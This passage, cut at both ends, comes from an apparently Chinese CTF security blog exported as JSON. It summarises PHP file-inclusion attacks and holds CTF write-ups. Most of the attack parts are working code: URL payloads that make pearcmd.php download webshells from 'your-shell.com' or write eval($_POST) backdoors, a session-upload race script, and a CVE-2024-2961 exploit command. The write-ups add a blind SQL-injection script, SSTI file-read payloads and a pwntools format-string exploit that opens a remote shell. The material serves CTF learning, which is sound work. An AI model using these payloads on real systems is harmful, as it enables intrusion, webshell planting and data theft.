)\n\ndef READ(session):\n    while True:\n        response = session.get(f'{url}?file={sess_path}/sess_{sessid}')\n        if 'upload_progress_' in response.text:\n            print(response.text)\n            sys.exit(0)\n        else:\n            print('++++++retry++++++')\n\ndef main():\n    with requests.session() as session:\n        t1 = threading.Thread(target=WRITE, args=(session,))\n        t1.daemon = True\n        t1.start()\n        READ(session)\nif __name__ == '__main__':\n    main()\n```\n\n\n\n# pear文件包含\n\n\n利用条件\n1：有文件包含点\n2：开启了`pear`扩展\n3：配置文件中`register_argc_argv`设置为`On`，而默认为`Off`\n\n>PEAR是为PHP扩展与应用库(PHP Extension and Application Repository)，它是一个PHP扩展及应用的一个代码仓库，类似于composer，用于代码的下载与管理。默认安装位置：`/usr/local/lib/php`\n\n那么这个`register_argc_argv`能干什么呢？简言之，可以通过`$_SERVER['argv']`获得命令行参数，其中以`+`作为分隔符\n\n![](/img/summary/file_include-12.png)\n\n\n在`pear`目录下有一个`pearcmd.php`，是`pear`命令调用的文件，是用来管理依赖的，类似python的pip。能包含它又能给参数的话，就可以用它来写木马了\n\n\n\n## 靶机可出网\n\n远程文件下载\n\n命令行语法：`pear install -R /tmp http://vps/shell.php`\n\n用`install`会下载到`/tmp/pear/download/`目录下，当然也可以用`-R`指定目录。而用`download`会下载到当前目录\n\n```text\n/?file=/usr/local/lib/php/pearcmd.php&+install+http://your-shell.com/shell.php\n/?file=/usr/local/lib/php/pearcmd.php&+install+-R+/var/www/html/+http://your-shell.com/shell.php\n/?file=/usr/local/lib/php/pearcmd.php&+download+http://your-shell.com/shell.php\n```\n\n## 靶机不出网\n\n姿势一：通过config-create写shell\n\n```text\n/?file=/usr/local/lib/php/pearcmd.php&aaaa+config-create+/<?=eval($_POST[a])?>+/tmp/shell.php\n/?file=/usr/local/lib/php/pearcmd.php&aaaa+config-create+/var/www/html/<?=`$_POST[a]`;?>+1.php\n```\n\n\n姿势二：将恶意的php代码写入配置文件中\n\n```text\n/?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/ctf.php+-d+man_dir=<?eval($_POST[1]);?>+-s+\n```\n\n\n# 绕过包含次数限制\n\n例题\n```php\n<?php\nrequire_once('flag.php');\nif(isset($_GET['content'])) {\n    $content = $_GET['content'];\n    require_once($content);\n}\n```\n\n因为`include_once`，`require_once`对于同一个文件只能包含一次，已经包含了`flag.php`一次了，那么就没办法继续包含它了吗？\n\npayload:\n`php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php`\n\n路径中的`/proc/self/root`就表示`/`\n\n具体分析原理的文章：[php源码分析 require_once 绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235)\n\n# FilterChain 利用 （iconv LFI）\n\n[hxp CTF 2021 - The End Of LFI?](https://tttang.com/archive/1395/)\n\n## 原理\n\n利用了PHP Base64 Filter 宽松的解析特性，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需临时文件的 RCE\n\n```php\n//解码的字符串中包含无效字符，那么就会忽略掉那些字符，只对有效字符进行解码\n\ndr0n11       -->  ZHIwbjEx\nZH<?Iw-bjEx  -->  dr0n11\n```\n\n即使我们在使用其他字符编码时产生了不可见字符，也可以利用 convert.base64-decode 来去掉非法字符，留下我们想要的字符\n\n\n\n## 利用\n\n\n因为不同的靶机环境有不同的字符集，所以可能会打不通，这时可以先fuzz一下，得到更为通用的字符集构造的POC\n\n\n**[PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)**\n\n**[PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator)**\n\n也可以用来绕过一些限定条件\n\n例如\n```php\n<?php\n    error_reporting(0);\n    if (isset($_GET['file'])) {\n        $content = file_get_contents($_GET['file']);\n        if (strpos($content, 'aaa') === False) {\n            die('failed to read');\n        }\n\n        else {\n            echo $content;\n            die();\n        }\n    }\n    else {\n            die('nothing here');\n    }\n\n?>\n```\n\n`python3 php_filter_chain_generator.py --chain 'aaa'`\n\n\n## 绕过\n\n`string.strip_tags`过滤器和`<`搭配使用\n\n\n```php\n(PHP 4, PHP 5, PHP 7, PHP 8)\nstrip_tags — 从字符串中去除 HTML 和 PHP 标签\n```\n\n当我们使用`php_filter_chain_generator`生成FilterChain的时候在结尾添加一个<标签\n\n![](/img/summary/file_include-13.png)\n\n![](/img/summary/file_include-14.png)\n\n在结尾手动添加一个`string.strip_tags`，过滤后面的乱字符\n\n![](/img/summary/file_include-15.png)\n\n\n# 侧信道读取文件-基于错误的oracle方式（error-based-oracle）\n\n与 FilterChain 利用相似\n\n限制条件：\n1：php 5.3 以下不能用\n2：极度依赖系统 iconv 提供的字符集\n\n\n例子\n\n\n```php\n//2024红明谷\n<?php\nhighlight_file(__FILE__);\n// flag.php\nif (isset($_POST['f'])) {\n    echo hash_file('md5', $_POST['f']);\n}\n?>\n```\n\n## 原理\n\n[The End of AFR?](https://tttang.com/archive/1755) 非常详细的解读了工作原理\n\n>使用 UCS-4LE 等编码技巧让 PHP 产生内存错误导致服务器产生 500 错误，配合 dechunk 编码使得前面的错误正常化从而获得一个盲注的判断依据，使用该依据以及编码技巧逐个判断盲注出文件内容，进而可以造成任意文件内容读取。\n\n## 受影响的函数\n\n基本上只要对文件执行操作，包括读取、写入或向文件追加内容，或者使用了链接到该文件的流都会受到影响\n\n| Function | Pattern |\n|---------|---------|\n| file_get_contents | file_get_contents(\\$_POST[0]); |\n| readfile | readfile(\\$_POST[0]); |\n| finfo->file | \\$file = new finfo(); \\$fileinfo = \\$file->file(\\$_POST[0], FILEINFO_MIME); |\n| getimagesize | getimagesize(\\$_POST[0]); |\n| md5_file | md5_file(\\$_POST[0]); |\n| sha1_file | sha1_file(\\$_POST[0]); |\n| hash_file | hash_file('md5', \\$_POST[0]); |\n| file | file(\\$_POST[0]); |\n| parse_ini_file | parse_ini_file(\\$_POST[0]); |\n| copy | copy(\\$_POST[0], '/tmp/test'); |\n| file_put_contents (only target read only with this) | file_put_contents(\\$_POST[0], \"\"); |\n| stream_get_contents | \\$file = fopen(\\$_POST[0], \"r\"); stream_get_contents(\\$file); |\n| fgets | \\$file = fopen(\\$_POST[0], \"r\"); fgets(\\$file); |\n| fread | \\$file = fopen(\\$_POST[0], \"r\"); fread(\\$file, 10000); |\n| fgetc | \\$file = fopen(\\$_POST[0], \"r\"); fgetc(\\$file); |\n| fgetcsv | \\$file = fopen(\\$_POST[0], \"r\"); fgetcsv(\\$file, 1000, \",\"); |\n| fpassthru | \\$file = fopen(\\$_POST[0], \"r\"); fpassthru(\\$file); |\n| fputs | \\$file = fopen(\\$_POST[0], \"rw\"); fputs(\\$file, 0); |\n\n\n## 利用\n\n[php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)\n\n`python3 filters_chain_oracle_exploit.py --target http://172.20.35.66/ --parameter 0 --file /flag`\n\n![](/img/summary/file_include-16.png)\n\n\n# 利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）\n\n## 原理\n\nGNU C 是一个标准的ISO C依赖库。在GNU C中，iconv()函数2.39及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。\n\n如果一个PHP应用中存在任意文件读取漏洞，攻击者可以利用iconv()的这个CVE-2024-2961漏洞，将其提升为代码执行漏洞。\n\n\n## 利用\n\n同样的，PHP的所有标准文件读取操作都受到了影响：file_get_contents()、hash_file()、file()、readfile()、fgets()、getimagesize()、SplFileObject->read()等\n\n[cnext-exploits](https://github.com/ambionics/cnext-exploits)\n\n`python3 cnext-exploit.py http://your-ip:8080/index.php \"echo '<?=phpinfo();?>' > shell.php\"`\n\n\n## 绕过\n\n手动修改脚本中的交互逻辑即可\n\n\n\n# 伪协议去除多余字符\n\n例子\n\n```php\n<?php\nhighlight_file(__FILE__);\n\n$content='lajilajilajilajilaji'.$_GET['a'].'lajilajilajilajilaji';\nfile_put_contents($_GET['name'].\".txt\",$content);\n\n$tmp = file_get_contents('123.txt');\neval($tmp($_GET['cmd']));\n```\n\n原理还是基于base64的宽松性\n\n所以只需要将垃圾字符转换成base64字符集以外的字符即可\n\n\n\n```php\n<?php\n$a ='system';\n$payload = iconv('utf-8', 'utf-16', base64_encode($a));\necho urlencode($payload);\n\n// 1：我们需要的数据\n// system\n\n// 2：base64后\n// c3lzdGVt\n\n// 3：utf-8转换为utf-16\n// %FF%FEc%003%00l%00z%00d%00G%00V%00t%00\n```\n\n\n```php\n<?php\n$b='lajilajilajilajilaji%FF%FEc%003%00l%00z%00d%00G%00V%00t%00lajilajilajilajilaji';\n$b=urldecode($b);\n$payload = iconv('utf-16', 'utf-8', $b);\n$payload = base64_decode($payload);\necho $payload;\n\n// 1：拼接后的数据\n// lajilajilajilajilaji%FF%FEc%003%00l%00z%00d%00G%00V%00t%00lajilajilajilajilaji\n\n// 2：utf-16转换为utf-8\n// 乱码c3lzdGVt乱码\n\n// 3：base64_decode\n// system\n```\n\n转成伪协议的写法\n\n`php://filter/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=`\n\n不同编码[在线转换网站](https://www.novel.tools/decode)\n\nphp还有很多支持的字符编码\n\n```php\nUCS-4*\nUCS-4BE\nUCS-4LE*\nUCS-2\nUCS-2BE\nUCS-2LE\nUTF-32*\nUTF-32BE*\nUTF-32LE*\nUTF-16*\nUTF-16BE*\nUTF-16LE*\nUTF-7\nUTF7-IMAP\nUTF-8*\nASCII*\nEUC-JP*\nSJIS*\neucJP-win*\nSJIS-win*\nISO-2022-JP\nISO-2022-JP-MS\nCP932\nCP51932\nSJIS-mac（别名：MacJapanese）\nSJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）\nSJIS-Mobile#KDDI（别名：SJIS-KDDI）\nSJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）\nUTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）\nUTF-8-Mobile#KDDI-A\nUTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）\nUTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）\nISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）\nJIS\nJIS-ms\nCP50220\nCP50220raw\nCP50221\nCP50222\nISO-8859-1*\nISO-8859-2*\nISO-8859-3*\nISO-8859-4*\nISO-8859-5*\nISO-8859-6*\nISO-8859-7*\nISO-8859-8*\nISO-8859-9*\nISO-8859-10*\nISO-8859-13*\nISO-8859-14*\nISO-8859-15*\nISO-8859-16*\nbyte2be\nbyte2le\nbyte4be\nbyte4le\nBASE64\nHTML-ENTITIES（别名：HTML）\n7bit\n8bit\nEUC-CN*\nCP936\nGB18030\nHZ\nEUC-TW*\nCP950\nBIG-5*\nEUC-KR*\nUHC（别名：CP949）\nISO-2022-KR\nWindows-1251（别名：CP1251）\nWindows-1252（别名：CP1252）\nCP866（别名：IBM866）\nKOI8-R*\nKOI8-U*\nArmSCII-8（别名：ArmSCII8）\n```\n\n\n\n\n\n参考文章1：[Docker PHP裸文件本地包含综述](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)\n参考文章2：[文件包含的几种不常规利用姿势](http://www.gem-love.com/2022/06/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8D%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/)\n参考文章3：[PHP Filter链——基于oracle的文件读取攻击](https://xz.aliyun.com/t/12939)","tags":["总结","文件包含"],"categories":["总结"]},{"title":"2021金砖企业信息系统安全决赛","url":"/posts/281f37d9/","content":"\n2021年就比完了初赛，但是因为疫情没能办成决赛，今年6月重启了比赛\n\n\n# Crypto #\n\n## Crypto-1 ##\nbase64->base32->base64-->base64\n![](/img/wp/2021/2021jinzhuan-1.png)\n\n\n## Crypto-2 ##\n变种凯撒\n![](/img/wp/2021/2021jinzhuan-2.png)\n\n上图引用的`caesar`是自定义的模块\n```python\nclass caesar:\n    \"\"\"\n        Type==1: Offset letters only\n        Type==2: Offset numbers only\n        Type==3: 1+2\n        Type==4: All characters\n    \"\"\"\n    def __init__(self):\n        text=\"\"\n        self.Type=1\n\n    def setType(self,Type):\n        if Type in [1,2,3,4]:\n            self.Type=Type\n        else:\n            print(\"Invalid type\")\n\n    def encode(self,text,num):\n        entext=''\n        if self.Type==1:\n            for i in range(0,len(text)):\n                if text[i].isupper():\n                    decup=(ord(text[i])-65+num)%26\n                    entext+=chr(decup+65)\n                elif text[i].islower():\n                    decup=(ord(text[i])-97+num)%26\n                    entext+=chr(decup+97)\n                else:\n                    entext+=text[i]\n            self.entext=entext\n        elif self.Type==2:\n            for i in range(0,len(text)):\n                if text[i].isnumeric():\n                    decup=(ord(text[i])-0x30+num)%10\n                    entext+=chr(decup+0x30)\n                else:\n                    entext+=text[i]\n            self.entext=entext\n        elif self.Type==3:\n            for i in range(0,len(text)):\n                if text[i].isupper():\n                    decup=(ord(text[i])-65+num)%26\n                    entext+=chr(decup+65)\n                elif text[i].islower():\n                    decup=(ord(text[i])-97+num)%26\n                    entext+=chr(decup+97)\n                elif text[i].isnumeric():\n                    decup=(ord(text[i])-0x30+num)%10\n                    entext+=chr(decup+0x30)\n                else:\n                    entext+=text[i]\n            self.entext=entext\n        elif self.Type==4:\n            for i in range(0,len(text)):\n                decup=(ord(text[i])-0x30+num)%128\n                entext+=chr(decup)\n            self.entext=entext\n        return self.entext\n    def decode(self,text,num=0):\n        detext=''\n        self.delist=[]\n        self.detext=''\n        if self.Type==1:\n            for j in range(num%26,26):\n                detext=''\n                for i in range(0,len(text)):\n                    if text[i].isupper():\n                        decup=(ord(text[i])-65+j)%26\n                        detext+=chr(decup+65)\n                    elif text[i].islower():\n                        decup=(ord(text[i])-97+j)%26\n                        detext+=chr(decup+97)\n                    else:\n                        detext+=text[i]\n                self.delist.append(detext)\n                if num:\n                    self.detext=detext\n        elif self.Type==2:\n            for j in range(num%10,10):\n                detext=''\n                for i in range(0,len(text)):\n                    if text[i].isnumeric():\n                        decup=(ord(text[i])-0x30+j)%10\n                        detext+=chr(decup+0x30)\n                    else:\n                        detext+=text[i]\n                self.delist.append(detext)\n                if num:\n                    self.detext=detext\n        elif self.Type==3:\n            for j in range(num%26,26):\n                for k in range(num%10,10):\n                    detext=''\n                    for i in range(0,len(text)):\n                        if text[i].isupper():\n                            decup=(ord(text[i])-65+j)%26\n                            detext+=chr(decup+65)\n                        elif text[i].islower():\n                            decup=(ord(text[i])-97+j)%26\n                            detext+=chr(decup+97)\n                        elif text[i].isnumeric():\n                            decup=(ord(text[i])-0x30+k)%10\n                            detext+=chr(decup+0x30)\n                        else:\n                            detext+=text[i]\n                    self.delist.append(detext)\n                    if num:\n                        self.detext=detext;\n        elif self.Type==4:\n            for j in range(num%128,128):\n                detext=''\n                for i in range(0,len(text)):\n                    decup=(ord(text[i])-128+j)%128\n                    detext+=chr(decup)\n                self.delist.append(detext)\n                if num:\n                    self.detext=detext\n        if len(self.detext):\n            return self.detext\n        if len(self.delist):\n            return self.delist\n```\n两次base64得到flag\n![](/img/wp/2021/2021jinzhuan-3.png)\n\n\n\n## Crypto-3 ##\n先分解n\n![](/img/wp/2021/2021jinzhuan-4.png)\n\ne和phi不互素\n\n```python\nimport gmpy2\n\nn = 22418636922065508104264650472638100390507346675022700253583060418349386472260539292033574216754214047540225287240029292436219548116787251605020424767984000804727346173028308816952737183433110999995264950414364145519999339949396799207404153148796900954086093431917244453864253649011176295266497073733547832171165497506613139960587280135867463235266546869960044777350378595302570142110464582590415694749192915651700844268466357439219626769665355230647219887042871785185100743750953935872489085346311527806979246650668966304323450610041756764667276881295676841136337294903126776228640645138477063815764467811948872156311\ne = 180\nc = 17971123746814947059314270113966290245749007752378241906733564181493060407114219968936077930494933520528427074831694818994710527963410153282657079091353179846750982127804195747725871635911272654572811618799762595633801414107052800867035212498914627567940429340162711284873714117628807667324064684965941290688518710890089086623981356782977499005308798890348799101436318386502089586589964942282091818134339082321114129830959264557408611168516265190076744300272908807347811446203373025446057616713876047942653095947804696077860211107853183353180163392501353685418796451123620066941329424857070023018877454625734091037559\nq = 149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259583527\np = 149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259582993\n\nn1=n-p-q+1\nt=gmpy2.gcd(e,n1)\ne=e//t\nd=gmpy2.invert(e,n1)\nm=gmpy2.powmod(c,d,n)\nmsg=gmpy2.iroot(m,t)\nprint(bytes.fromhex(hex(msg[0])[2:]))\n```\n\n![](/img/wp/2021/2021jinzhuan-5.png)\n\n\n## Crypto-4 ##\n\nADFGVX解密\n百度得到[原题](https://blog.csdn.net/euzen/article/details/119085350)\n\n\n\n\n\n# Misc #\n## Misc-1 ##\n直接strings\n![](/img/wp/2021/2021jinzhuan-6.png)\n\n\n## Misc-2 ##\nbinwalk分解出一堆zlib文件\n使用`ls | grep -v zlib | xargs strings`命令可以发现结尾有一串字符串\n两次base64后得到flag\n\n\n\n## Misc-3 ##\n文件尾发现`id you try lsb?`\nstegsolve发现`ff d8`,另存为jpg\n![](/img/wp/2021/2021jinzhuan-7.png)\n\n十六进制模式下发现一串字符串\n![](/img/wp/2021/2021jinzhuan-8.png)\n\nbase64解密后得到flag\n\n\n## Misc-4 ##\n音频文件，播放后具有非常明显的sstv特征\n在手机上使用`robot36`监听得到flag\n\n![](/img/wp/2021/2021jinzhuan-9.png)\n\n\n\n\n# WEB #\n## Web-1 ##\n在js中可以看到游戏的逻辑\n![](/img/wp/2021/2021jinzhuan-10.png)\n\n访问`23881361B86C77CD.php`，点击`key在这里`会跳转，抓包，在返回值中得到flag\n\n![](/img/wp/2021/2021jinzhuan-11.png)\n\n\n## Web-2 ##\n简单过滤的sql盲注\nexp：\n```python\nimport requests\nimport urllib.parse\ndef sqlinjet(url,payload):\n    header={\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',\n        'Cookie': \"UM_distinctid = 175b18dcb384ba-0f290792fb4f06-230346d-144000-175b18dcb39493;CNZZDATA1261218610 =1200642698-1605001662-%7C1605366994\",\n        \"Content-Type\": \"application/x-www-form-urlencoded\"\n            }\n    flag=''\n    for i in range(1,100):\n        low = 32\n        high = 128\n        mid = (low + high) // 2\n        while(low < high):\n            data = {\n                'uname': payload.format(i,mid),\n                'passwd': \"1\",\n            }\n            r = requests.post(url=url,data=data,headers=header)\n            print(data)\n            if '不存在此用户' in r.text:\n               low = mid + 1\n            else:\n               high = mid\n            mid = (low + high) // 2\n        flag += chr(mid)\n        print(flag)\n        if mid == 32 or mid == 132:\n            break\n\nurl='http://101.133.132.222:8002/login.php'\npayload_all_database=\"\"\npayload_database=\"1'^(ascii(substring((select(database()))from({})))>{})^'1\"\npayload_table=\"1'^(ascii(substring((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where(table_schema=database()))from({})))>{})^'1\"\n\nuname=\"1'^(ascii(substring((select(group_concat(uname))from(admin))from({})))>{})^'1\"\npassword=\"1'^(ascii(substring((select(group_concat(passwd))from(admin))from({})))>{})^'1\"\nsqlinjet(url,password)\n```\n\n注入得到密码，md5解密后得到`5555666`\n\n![](/img/wp/2021/2021jinzhuan-12.png)\n\n登录拿到flag\n\n\n\n## Web-4 ##\n扫描目录得到`index.php.bak`\n![](/img/wp/2021/2021jinzhuan-13.png)\n\n得到部分源代码\n```php\nmd5($_GET['name']) == md5($_GET['pwd'])\n```\nphp弱比较，传入两个数组即可\n\npayload:\n`http://101.133.132.222:8004/index.php?name[]=admin&pwd[]=admin123`\n\n\n\n## Web-5 ##\n题目url后的路径可控，会直接回显出来\n尝试`xss`和`ssti`\n发现存在`xss`，但是`xss`不好利用，使用`{{7*7}}`测试，发现也存在`ssti`注入\n\n报错后得到框架是`jinja2`\n\nfuzz后发现过滤了`class.`关键字，可以通过加号拼接`class`来绕过\n\n先获取`FileLoader`类\n`http://101.133.132.222:8005/{{()['__cla'+'ss__'].__base__['__subclas'+'ses__']()}}`\n\n![](/img/wp/2021/2021jinzhuan-14.png)\n\n\n调用类`get_data`方法读文件\n`http://101.133.132.222:8005/{{()['__cla'+'ss__'].__base__['__subclas'+'ses__']()[79][\"get_data\"](0,\"/flag\")}}`\n\n![](/img/wp/2021/2021jinzhuan-15.png)\n\n\n# Reverse #\n\n## Reverse-1 ##\n直接strings\n![](/img/wp/2021/2021jinzhuan-16.png)\n\n\n\n# PWN #\n## Pwn-1 ##\n\n查看代码发现`main`函数中存在两次格式化字符串\n\n通过第一次格式化字符串获取`__libc_start_main`函数地址\n同时获取`libc`地址，通过`libc`获取`system`函数地址\n\n通过第二次格式化字符串将`fini_array`替换为`main`函数\n使我们可以再次输入数据，并把`printf`函数在`got`表中的数据修改为`system`函数地址\n这样在第二次执行`main`函数时，输入`/bin/sh`或`sh`就可以执行`system(\"/bin/sh\")`来获取`shell`了\n\n![](/img/wp/2021/2021jinzhuan-17.png)\n\n\nexp\n```python\nfrom pwn import *\nlibc=ELF('libc-2.23.so',checksec=0)\ne=ELF('./pmagic',checksec=0)\np=remote('106.14.91.65',10000)\n#p=process('pmagic')\n#gdb.attach(p,'bp 0x400838')\np.readuntil('name.\\n')\np.send('%43$p')\nd=int(p.readuntil('Say',drop=1)[:-1],16)-240\nlibc.address=d-libc.sym['__libc_start_main']\nsystem=libc.sym['system']\nfini=0x600a78\nprintf=e.got['printf']\nmain=0x400797\nprint(hex(main))\nprint(hex(fini))\nprint(hex(system))\nprint(hex(printf))\n\na=[0x97,0x7,0x40]\ni=system\nwhile i!=0:\n    a.append(i&0xff)\n    i=i>>8\n\n\nb=[fini,fini+1,fini+2,printf,printf+1,printf+2,printf+3,printf+4,printf+5]\nc={}\nfor i in range(0,len(a)):\n    c[a[i]]=b[i]\n\na.sort()\nprint(a)\nprint(b)\nprint(c)\npayload=''\nn=0\n\nfor i in range(0,len(a)):\n    if i>0:\n        payload+='%'+str(a[i]-a[i-1])+'c%'+str(28+i)+'$hhn'\n    else:\n        payload+='%'+str(a[i])+'c%'+str(28+i)+'$hhn'\n    n=n+1\nprint(hex(len(payload)))\npayload=payload.ljust(0xa0,'a')\n\nfor i in a:\n    payload+=p64(c[i])\n\nprint(hex(len(payload)))\nprint(payload)\np.sendline(payload)\n\np.interactive()\n```\n\n![](/img/wp/2021/2021jinzhuan-18.jpg)\n\n","tags":["wp","2021竞赛","金砖"],"categories":["wp"]},{"title":"第二届vecctf-wp","url":"/posts/e6acd4f1/","content":"\n\n# misc #\n\n## zip-guessing ##\n\n打开压缩包发现提示`password=.......py`\n\n进行6位密码爆破，得到密码`3a1b6c`\n\n解压得到flag\n\n\n>flag{fa8d910600a5467d9d2f433f2bba4c80}\n\n\n## Spiderman ##\n\n修改高度，发现字符串`README：HAHAyoufoundIT`\n\nbinwalk分离出一个带密码的压缩包\n\n压缩包中含有一个名为`README.txt`的文件\n将`HAHAyoufoundIT`写入`README.txt`并压缩成zip文件后发现两个`README.txt`的crc一致\n\n![](/img/wp/2022/2022vec-1.png)\n\n采用明文爆破出密码`!g^c*0`\n![](/img/wp/2022/2022vec-2.png)\n\n解压后得到一张png\n\n`stegsolve`分析图片，发现`0`通道中藏有flag\n\n>flag{Z1p_1maGE_lSB_1nterestiNG}\n\n\n\n\n\n\n# crypto #\n\n## baby rsa ##\n\n因为两组数据的N相同，尝试共模攻击\n\n```python\nimport random\nimport gmpy2\nn,e1 = (18278250860121129714191417969518671565676609370438974713591911937173608105906651505337301762681939894104610580889645217298111784819358890536088923234106589063389221021186473430580352803412280849862104635302801082728967968107748121682339447067731887326087497520544915737621714860811217331095698945949486830528216492874665673677441699322439459330337628648399309373351992766984612437555092804129107438390294123179182945321411199463748963590901018595492869891970965012682196059824464339830536600021131729277503225240822584625293463254992623570796895110736563514265569133338477447460712899749955523316083254492005199917987, 76831)\nc1 = 14068017239200053057485191549313171235040341952680207740172042657952395329165768631549600187463451884623632792268314205814005668826033658861436424617991125160661381291003863394279707111450435808077534541510943745285958554921154542813613390731768463465972495263609910077893559813685204864361223917445770159726623708768996447642959844639282015350260298045019617026128700143368357847147111693153254268063490280666808714031170237337721534721243540077707555520501582047389390048200750092516532861791678414405037042484148584170396597267139826760931348123330503380212299827883145622326471261247290265669559897644089748984204\nn,e2 = (18278250860121129714191417969518671565676609370438974713591911937173608105906651505337301762681939894104610580889645217298111784819358890536088923234106589063389221021186473430580352803412280849862104635302801082728967968107748121682339447067731887326087497520544915737621714860811217331095698945949486830528216492874665673677441699322439459330337628648399309373351992766984612437555092804129107438390294123179182945321411199463748963590901018595492869891970965012682196059824464339830536600021131729277503225240822584625293463254992623570796895110736563514265569133338477447460712899749955523316083254492005199917987, 65537)\nc2 = 17120091052055468753592285548832983539343349280048150965811042901415659935929189229298761316319784219958366772027986939749507760509991462838561325114714990126772560070483939658678703332135866293838146121312972251030190756953273311362066029287803984179301942229948301600814847050270084193184210232673652417884727838290706970298245205101865234726242081382680212621541249662659284218079172180588507736208257188130972936994297239579885142233896240153633237886314935309710560434501987121687537279749951910677771351212584805615709915168729977338949858374823750316083595198620089092891606394712323216539675547753350603350269\ns=gmpy2.gcdext(e1,e2)\ns1=s[1]\ns2=s[2]\nif s1<0:\n    s1=-s1\n    c1=gmpy2.invert(c1,n)\nelse:\n    s2=-s2\n    c2=gmpy2.invert(c2,n)\n\nc1=gmpy2.powmod(c1,s1,n)\nc2=gmpy2.powmod(c2,s2,n)\nc=(c1*c2)%n\nprint(bytes.fromhex(hex(c)[2:]))\n```\n\n![](/img/wp/2022/2022vec-3.png)\n\n>flag{423c35691377ea18d35b97b7b6f13590}\n\n\n\n\n\n# web #\n\n## ezfilter ##\n\n\n抓包，在密码处尝试sql注入，回显了mysql的报错\n\n![](/img/wp/2022/2022vec-4.png)\n\nfuzz后发现过滤了空格，可以用`/**/`代替空格\n\nsqlmap跑一下得到flag\n`sqlmap -r 1.txt --batch --tamper \"space2comment.py\" --dump`\n\n![](/img/wp/2022/2022vec-5.png)\n\n>flag{30b08224ed436c8c690ae623a89466f3}\n\n\n## upload ##\n\n在源码中发现`hint: TUhnd2VEQjRiRzluYVc0dWNHaHc=`\n\n两层base64得到`0x0x0xlogin.php`\n\n通过弱口令爆破进入后台 `admin`,`admin123456`\n\n在项目管理处发现一个文件上传点\n\n通过将文件名置空，报错得到上传路径`uploaded`\n![](/img/wp/2022/2022vec-6.png)\n\nfuzz后发现允许上传`.htaccess`\n![](/img/wp/2022/2022vec-7.png)\n\n\n再上传一个图片马即可\n\n![](/img/wp/2022/2022vec-8.png)\n\n\n蚁剑连接得到flag\n\n>flag{063a5bda0b5a2a5d7b700d989f73902b}\n\n\n## WEB2 ##\n\n查看源码：`/index.php?source`\n\n关键代码如下\n```php\nif (isset($_POST['session_id'])) {\n    $query = \"SELECT * FROM secrets WHERE session_id = '\" . $_POST['session_id'] . \"'\";\n    $result = $conn->query($query);\n} else {\n    $query = \"SELECT * FROM secrets WHERE session_id = '\" . session_id() . \"'\";\n    $result = $conn->query($query);\n}\n```\n\nwhere后面为`true`就行了\n\npayload：`1' or '1'='1`\n\n\n## EzCas ##\nApereo Cas反序列化\n\n题目不出网，公开的普通exp没有回显\n在github上找到一个[带回显的项目](https://github.com/MrMeizhi/ysoserial-mangguogan)\n\n生成payload\n![](/img/wp/2022/2022vec-9.png)\n\n构造命令\n![](/img/wp/2022/2022vec-10.png)\n\n\n\n# Mobile #\n\n## findme ##\n\n模拟器先安装一下，有个查询按钮\n\napk文件，使用jadx分析\n\n先全局搜索找到`onClick`函数，查看`点击查询按钮`时执行的代码\n\n```java\npublic class OooO0O0 implements View.OnClickListener {\n\n    /* renamed from: OooO0o0  reason: collision with root package name */\n    public final /* synthetic */ EditText f1853OooO0o0;\n\n    public OooO0O0(EditText editText) {\n        this.f1853OooO0o0 = editText;\n    }\n\n    public void onClick(View v) {\n        try {\n            LoginActivity.this.OooOo0o.OooO0Oo(this.f1853OooO0o0.getText().toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n发现调用了`LoginActivity.this.OooOo0o.OooO0Oo`，查看函数声明\n\n发现存在数据库\n\n`getWritableDatabase`函数用来连接数据库\n`OooO0OO`函数用来获取数据库密码\n`this.f1221OooO0o`为`OooO0OO`的对象\n\n\n```java\npublic void OooO0O0(String t) {\n    this.OooO0oO = t;\n    SQLiteDatabase.loadLibs(this.f1222OooO0o0);\n    this.f1221OooO0o = new OooO0OO(this.f1222OooO0o0);\n    String OooO0OO2 = OooO0OO();\n    this.f1220OooO0Oo = OooO0OO2;\n    this.f1219OooO0OO = this.f1221OooO0o.getWritableDatabase(OooO0OO2);\n    new OooO0O0();\n    for (int g = 0; g < 100; g++) {\n        ContentValues values = new ContentValues();\n        values.put(\"flag\", OooO0O0.OooO00o(\"\" + g));\n        values.put(\"num\", Integer.valueOf(g));\n        this.f1219OooO0OO.insert(\"test\", null, values);\n    }\n}\n\n\npublic void OooO0Oo(String i) {\n    SQLiteDatabase.loadLibs(this.f1222OooO0o0);\n    this.f1221OooO0o 